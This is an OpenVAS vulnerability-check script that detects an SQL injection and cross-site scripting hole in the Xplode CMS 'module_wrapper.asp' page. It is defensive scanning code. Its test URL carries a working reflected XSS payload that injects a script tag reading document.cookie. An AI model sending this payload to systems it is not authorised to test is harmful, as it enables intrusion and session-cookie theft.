###############################################################################
# OpenVAS Vulnerability Test
# $Id: Xplode_34419.nasl 5771 2017-03-29 15:14:22Z cfi $
#
# Xplode 'module_wrapper.asp' SQL Injection and Cross Site Scripting
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Xplode is prone to an SQL-injection vulnerability and a cross-site
  scripting vulnerability because it fails to sufficiently sanitize
  user-supplied data.

  Exploiting these issues could allow an attacker to steal
  cookie-based authentication credentials, compromise the application,
  access or modify data, or exploit latent vulnerabilities in the
  underlying database.";

if(description)
{
 script_id(100113);
 script_version("$Revision: 5771 $");
 script_tag(name:"last_modification", value:"$Date: 2017-03-29 17:14:22 +0200 (Wed, 29 Mar 2017) $");
 script_tag(name:"creation_date", value:"2009-04-08 20:52:50 +0200 (Wed, 08 Apr 2009)");
 script_bugtraq_id(34419);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Xplode 'module_wrapper.asp' SQL Injection and Cross Site Scripting Vulnerabilities");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34419");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_asp(port:port)) exit(0);

foreach dir( make_list_unique( "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, '/module_wrapper.asp?wrap_script=modules/Search+results/search.asp&SearchType=all&SearchString=">><script>alert(document.cookie)</script>');

  if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(document\.cookie\)</script>", check_header:TRUE)) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
